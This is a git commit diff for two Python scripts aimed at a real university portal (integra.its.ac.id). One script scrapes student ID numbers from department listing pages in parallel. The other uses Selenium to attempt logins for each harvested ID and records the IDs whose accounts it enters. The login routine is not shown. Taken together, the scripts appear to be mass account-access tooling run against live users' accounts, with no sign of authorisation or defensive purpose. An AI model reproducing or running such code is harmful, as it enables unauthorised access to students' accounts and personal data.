3a90d0c10eb1e1da8831005b7702d87702d437ad
svmihar <svmihar@gmail.com>
2019-09-09 16:18:31 +0700

    added new multiprocessing on generating the nrp

--- go.py
+++ go.py
@@ -11,8 +11,6 @@ chrome_options = Options()
 chrome_options.add_argument("--start-maximized")
 
 url = 'https://integra.its.ac.id/'
-# driver = webdriver.Firefox(executable_path='../../geckodriver.exe')
-# driver = webdriver.PhantomJS(executable_path='../../phantomjs.exe')
 driver = webdriver.Chrome(executable_path='../../chromedriver.exe', chrome_options=chrome_options)
 
 driver.get(url) 
@@ -39,33 +37,35 @@ def wait_til(xpath):
         WebDriverWait(driver,2).until(
         EC.visibility_of_element_located((By.XPATH,xpath))
     )
-i = 0
-jumlah_berhasil = 0
 
-for nrp in koleksi_nrp: 
-    nrp = nrp.strip()
-    driver.delete_all_cookies()
-    wait_til('//*[@id="password"]')
-    login(nrp)
+if __name__ == '__main__':        
+    i = 0
+    jumlah_berhasil = 0
 
-    i+=1
-    try: 
-        wait_til('//*[@id="navbarDropdown"]')
-        time.sleep(.5)
-        body = driver.find_element(By.TAG_NAME,'body')
-        if 'SI Beasiswa' in body.text:  
-            with open('berhasil.txt','a') as f: 
-                f.writelines(nrp+'\n')
-            logout()    
-            jumlah_berhasil+=1
-            print(nrp,'masuk')
-            driver.delete_all_cookies()
-            continue
-        else: 
-            print(nrp, 'gagal dari if')
-            driver.delete_all_cookies()
-    except: 
-        print(nrp,'gagal')
+    for nrp in koleksi_nrp: 
+        nrp = nrp.strip()
         driver.delete_all_cookies()
-    print('trying', i,'/',len(koleksi_nrp),'\n jumlah berhasil: ', jumlah_berhasil)
-driver.quit()
+        wait_til('//*[@id="password"]')
+        login(nrp)
+
+        i+=1
+        try: 
+            wait_til('//*[@id="navbarDropdown"]')
+            time.sleep(.5)
+            body = driver.find_element(By.TAG_NAME,'body')
+            if 'SI Beasiswa' in body.text:  
+                with open('berhasil.txt','a') as f: 
+                    f.writelines(nrp+'\n')
+                logout()    
+                jumlah_berhasil+=1
+                print(nrp,'masuk')
+                driver.delete_all_cookies()
+                continue
+            else: 
+                print(nrp, 'gagal dari if')
+                driver.delete_all_cookies()
+        except: 
+            print(nrp,'gagal')
+            driver.delete_all_cookies()
+        print('trying', i,'/',len(koleksi_nrp),'\n jumlah berhasil: ', jumlah_berhasil)
+    driver.quit()
--- pencari_nrp.py
+++ pencari_nrp.py
@@ -1,18 +1,16 @@
+#!/usr/bin/env python
+
 import requests
+from fire import Fire
 from bs4 import BeautifulSoup
-from pprint import pprint
+from tqdm import tqdm
 import time
-import random
-
-nrp = []
-pages = []
-
-with open('jurusan.txt', 'r') as f:
-    links = f.readlines()
+from multiprocessing import Pool
 
 
 def cari_last_page(link):
-    req = requests.get(link) >
+    pages = []
+    req = requests.get(link)
     soup = BeautifulSoup(req.text, 'lxml')
     paginations = soup.find_all('div', {'class': 'pagination'})
     for pagination in paginations:
@@ -21,37 +19,68 @@ def cari_last_page(link):
             pages.append(link['href'])
     last_page = pages[-1]
     last_page_number = int(last_page.split('/')[-1])
-    print('Ditemukan', last_page_number)
     return int(last_page_number)
 
 
-# writes to txt
 def cari_nrp(link):
     page = requests.get(link)
     soup = BeautifulSoup(page.text, 'lxml')
     table = soup.find_all('td')
-    for element in table:
-        text = element.text.strip()
-        if len(text) > 4 and text.isdigit():
-            hasil = text
-            print(hasil)
-            with open('nrp.txt', 'a') as f:
-                f.writelines(hasil+'\n')
+    return [element.text.strip() for element in table if len(element.text.strip()) > 4 and element.text.strip().isdigit()]
 
 
-for link in links:
-    link = link.strip()
-    print('now trying', link)
-    current = cari_last_page(link)
-    print(current)
-    cari_disini = []
-    for i in range(int(current/20)+1):
-        page_link = link+'/'
-        page_link = page_link+str(current)
-        current -= 20
-        if current == 0:
-            page_link += str('')
-        time.sleep(random.randint(1, 3))
-        cari_nrp(page_link)
+def pembagi(l, n):
+    for i in range(0, len(l), n):
+        yield l[i:i+n]
 
-    print(nrp)
+
+def generate_links(list_of_links):
+    hasil = []
+    print('generating links...')
+    for link in tqdm(list_of_links):
+        try:
+            c_p = cari_last_page(link)
+            for _ in range(c_p):
+                page = f'{link}/{c_p}'
+                c_p -= 20
+                if c_p == 0:
+                    hasil.append(f'{link}/')
+                    break
+                hasil.append(page)
+        except:
+            print(f'error on {link}')
+
+    with open('link_mahasiswa.txt', 'a+') as f:
+        for h in hasil:
+            f.writelines(h+'\n')
+    return hasil
+
+import os
+def main(n_jobs=10, chunks=100):
+    links = open('jurusan.txt').read().splitlines()
+
+
+    if os.path.exists('link_mahasiswa.txt'):
+        print('file ditemukan')
+        mahasiswa = open('link_mahasiswa.txt').read().splitlines()
+        mahasiswa=list(set(mahasiswa))
+    else:
+        mahasiswa = generate_links(links)
+
+    mahasiswa = list(pembagi(mahasiswa,chunks))
+
+    for i, m in enumerate(mahasiswa):
+        print(f'progress: {i}/{len(mahasiswa)}')
+        with Pool(n_jobs) as p:
+            hasil = list(tqdm(p.imap(cari_nrp, m), total=len(mahasiswa)))
+        p.terminate()
+        p.join()
+        hasil_ = [x for l in hasil for x in l]
+        hasil_ = list(set(hasil_))
+        with open('nrp.txt', 'a+') as f:
+            for h in hasil_:
+                f.writelines(h+'\n')
+
+
+if __name__ == '__main__':
+    Fire()
